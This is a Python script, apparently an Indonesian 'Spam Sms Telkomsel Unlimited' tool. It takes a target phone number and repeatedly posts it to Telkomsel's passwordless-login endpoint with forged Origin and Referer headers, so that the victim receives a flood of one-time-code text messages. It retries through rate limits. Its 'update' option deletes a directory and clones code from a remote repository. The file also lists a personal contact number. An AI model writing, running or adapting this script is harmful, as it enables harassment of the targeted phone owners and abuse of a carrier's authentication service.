#!/usr/bin/env python3
# Coded By : Mr.F124NZ
# Contact me on WA : +6285211523414
# thanks to Mr.Zettamus
# Versi : 1.0
import requests
import random
import time
import sys
import os
# WARNA
now=time.strftime
Y = '\033[93m'
G = '\x1b[32m'
R = '\033[31;1m'
r = "\033[0m"
C = '\033[1;36m'
print(r)
os.system('clear')
# Checking Update
try:
    versi='1.1'
    requp=requests.get('https://raw.githubusercontent.com/zettamus/ZSpam/master/README.md').text
    if versi in str(requp):
        up=r+r+'['+G+'INFO'+r+'] Type ['+G+'99'+r+'] to update '
        update= r+'['+C+now("%X")+r+'] Updating Z Spam tools...'
        ver=r+'['+G+'INFO'+r+'] New version is available. Update now'
except: pass
# RUNNING TEXT
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
mengetik(Y+'    ( Spam Sms Telkomsel Unlimited )')
mengetik(R+' Powered By:')
print(G+'        _____ _ ____  _  _   _   _ _____')
print('       |  ___/ |___ \| || | | \ | |__  /')
print('       | |_  | | __) | || |_|  \| | / /')
print('       |  _| | |/ __/|__   _| |\  |/ /_')
print('       |_|   |_|_____|  |_| |_| \_/____|')
print('                                   V 1.0   ')
print(C+']--------------------||--------------------[')
print('')
# MAIN
try:
    print(ver)
    print(up)
except: pass
print( r+'['+G+'INFO'+r+'] Ketik "'+G+'info'+r+'" Untuk Informasi Tools')
no=input(r+"["+G+"*"+r+"] No target : "+G)
if no =='':
    exit(r+"["+R+now('%X')+r+"] Tidak Boleh Kosong..!")
elif no == 'info':
    print(r+'['+G+'INFO'+r+'] Bekerja pada nomor yang belum terdaftar pada App my telkomsel..')
    exit(r+'['+G+'INFO'+r+'] Tools Ini Dibuat Oleh: '+G+'Mr.F124NZ ')
elif no =='99':
    try:
        print(update)
        print(r+'['+C+'*'+r+'] Mohon Tunggu ...')
        os.system('cd ..;rm -rf docomo')
        os.system('cd ..;git clone https://github.com/F124NZ/sms > /dev/null 2>&1')
        exit(r+"["+R+now('%X')+r+"] Update Selesai..")
    except:
        exit(r+"["+R+now('%X')+r+"] Your tools is the latest version")
elif len(no) < 10:
    exit(r+"["+R+now('%X')+r+"] Nomor Tidak Valid")
header = {'Origin':'https://my.telkomsel.com',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept':'application/json, text/javascripte',
        'Referer':'https://my.telkomsel.com/',
        'Connection':'keep-alive'}
dat={'phone_number':'+'+no,'connection':'sms'}


# PENGULANGAN
count=0
while True:
    time.sleep(1)
    try:
        c=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=dat,headers=header).text
        if "false" in c:
            count+=1
            print(r+'\n['+G+now("%X")+r+'] Pesan Terkirim...['+G+str(count)+r+']')
        elif 'Too Many Requests' in c:
            print(r+'\r['+Y+now("%X")+r+'] Mohon Tunggu..!!',end='')
        else:
            print(r+'\n['+G+now("%X")+r+'] Gagal :(')
    except KeyboardInterrupt:
        exit(r+'\n['+R+now("%X")+r+'] Keluar : Ok!')
    except requests.ConnectionError:
        exit(r+'\n['+R+now("%X")+r+'] Periksa Koneksi Internet !')
    except Exception as f:
        exit(r+'\n['+R+now("%X")+r+'] '+str(f))

